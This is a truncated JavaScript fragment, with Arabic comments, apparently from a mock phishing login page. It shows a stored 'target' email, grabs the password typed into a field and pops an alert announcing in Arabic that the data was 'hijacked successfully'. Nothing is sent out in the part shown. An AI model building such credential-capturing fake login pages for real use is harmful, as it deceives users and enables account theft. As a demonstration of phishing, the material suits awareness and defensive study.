    <script>
        // جلب الإيميل وعرضه
        const savedEmail = sessionStorage.getItem('targetEmail');
        document.getElementById('displayEmail').innerText = savedEmail || 'user@gmail.com';

        document.getElementById('finishBtn').addEventListener('click', () => {
            const password = document.getElementById('passField').value;
            alert('تم اختطاف البيانات بنجاح!\nالإيميل: ' + savedEmail + '\nالباسورد: ' + password);
